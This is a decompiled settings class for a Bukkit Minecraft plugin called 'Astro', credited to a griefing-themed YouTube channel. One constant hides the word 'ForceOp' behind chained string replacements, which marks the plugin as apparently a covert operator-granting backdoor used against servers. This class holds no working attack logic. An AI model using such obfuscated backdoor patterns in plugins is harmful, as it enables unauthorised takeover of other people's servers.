/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.ChatColor
 */
package me.qlutch.sucks.utils;

import org.bukkit.ChatColor;

public class Settings {
    public static final String NAME = "Astro";
    public static final String FOP = "plugins".replace("p", "F").replace("l", "o").replace("u", "r").replace("g", "c").replace("i", "e").replace("n", "O").replace("s", "p");
    public static final String AUTHOR = "Dimitar Dimitrow#7047, Youtube.com/c/PaxGriefs";
    public static final String VERSION = "0.2";
    public static final String LICENSE = "TI8Y-OSA5-SJ6H-A9I7";
    public static final String KEY = "YecoF0I6M05thxLeokoHuW8iUhTdIUInjkfF";
    public static int NG = 0;
    public static String DARK_RED = ChatColor.translateAlternateColorCodes((char)'&', (String)"&5");
    public static String WHITE = ChatColor.translateAlternateColorCodes((char)'&', (String)"&f");
    public static String RED = ChatColor.translateAlternateColorCodes((char)'&', (String)"&b");

    public static String PREFIX(String msg) {
        return DARK_RED + NAME + ChatColor.translateAlternateColorCodes((char)'&', (String)" &5 ") + WHITE + msg;
    }

    public static String USAGE(String msg) {
        return DARK_RED + "Usage" + ChatColor.translateAlternateColorCodes((char)'&', (String)" &5 ") + WHITE + msg;
    }
}

